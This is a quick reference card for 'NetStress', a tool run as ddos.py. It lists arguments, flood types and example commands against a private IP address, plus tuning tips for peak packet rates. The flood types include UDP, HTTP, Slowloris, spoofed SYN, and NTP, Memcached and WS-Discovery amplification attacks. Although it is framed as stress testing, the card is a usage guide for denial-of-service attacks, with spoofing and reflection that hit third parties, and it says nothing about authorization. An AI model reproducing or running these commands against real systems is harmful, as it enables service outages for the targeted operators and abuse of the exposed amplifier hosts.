# NetStress Quick Reference

Quick command reference card.

---

## Basic Syntax

```bash
python ddos.py -i <TARGET> -p <PORT> -t <PROTOCOL> -d <DURATION>
```

---

## Arguments

| Arg  | Long            | Description         | Default  |
| ---- | --------------- | ------------------- | -------- |
| `-i` | `--ip`          | Target IP/hostname  | Required |
| `-p` | `--port`        | Target port         | Required |
| `-t` | `--type`        | Protocol type       | Required |
| `-d` | `--duration`    | Duration (seconds)  | 60       |
| `-x` | `--threads`     | Worker threads      | 4        |
| `-s` | `--size`        | Packet size (bytes) | 1472     |
| `-v` | `--verbose`     | Verbose output      | Off      |
|      | `--ai-optimize` | AI optimization     | Off      |
|      | `--status`      | Show system info    | -        |
|      | `--insights`    | Show insights       | -        |

---

## Protocols

### No Root Required

| Protocol  | Description          |
| --------- | -------------------- |
| `UDP`     | UDP packet flood     |
| `TCP`     | TCP connection flood |
| `HTTP`    | HTTP request flood   |
| `HTTPS`   | HTTPS request flood  |
| `DNS`     | DNS query flood      |
| `SLOW`    | Slowloris attack     |
| `ENTROPY` | Random data flood    |

### Root Required

| Protocol       | Description       |
| -------------- | ----------------- |
| `TCP-SYN`      | SYN flood         |
| `TCP-ACK`      | ACK flood         |
| `PUSH-ACK`     | PSH+ACK flood     |
| `SYN-SPOOF`    | Spoofed SYN       |
| `ICMP`         | Ping flood        |
| `NTP`          | NTP amplification |
| `MEMCACHED`    | Memcached amp     |
| `WS-DISCOVERY` | WS-Discovery amp  |

---

## Common Commands

```bash
# Check system status
python ddos.py --status

# UDP flood (60 seconds)
python ddos.py -i 192.168.1.100 -p 80 -t UDP -d 60

# TCP flood (8 threads)
python ddos.py -i 192.168.1.100 -p 80 -t TCP -x 8

# HTTP flood
python ddos.py -i 192.168.1.100 -p 80 -t HTTP -d 60

# SYN flood (requires root)
sudo python ddos.py -i 192.168.1.100 -p 80 -t TCP-SYN

# Slowloris (500 connections)
python ddos.py -i 192.168.1.100 -p 80 -t SLOW -x 500

# With AI optimization
python ddos.py -i 192.168.1.100 -p 80 -t UDP --ai-optimize

# Verbose output
python ddos.py -i 192.168.1.100 -p 80 -t UDP -v
```

---

## Performance Tips

| Goal            | Command        |
| --------------- | -------------- |
| Max PPS         | `-s 64 -x 8`   |
| Max bandwidth   | `-s 1472 -x 4` |
| Connection test | `-t TCP -x 16` |
| Web server test | `-t HTTP -x 8` |

---

## Troubleshooting

| Problem            | Solution                          |
| ------------------ | --------------------------------- |
| Permission denied  | Use `sudo` or run as admin        |
| Low performance    | Install native engine             |
| Module not found   | `pip install -r requirements.txt` |
| Connection refused | Check target port is open         |

---

## Files

```
NetStress/
├── ddos.py          # Main entry point
├── requirements.txt # Dependencies
├── core/            # Core modules
├── docs/            # Documentation
├── tests/           # Test suite
└── scripts/         # Utilities
```

---

## Links

- [Full CLI Reference](CLI_USAGE.md)
- [Installation Guide](INSTALLATION.md)
- [Troubleshooting](TROUBLESHOOTING.md)
- [GitHub](https://github.com/Destroyer-official/NetStress)
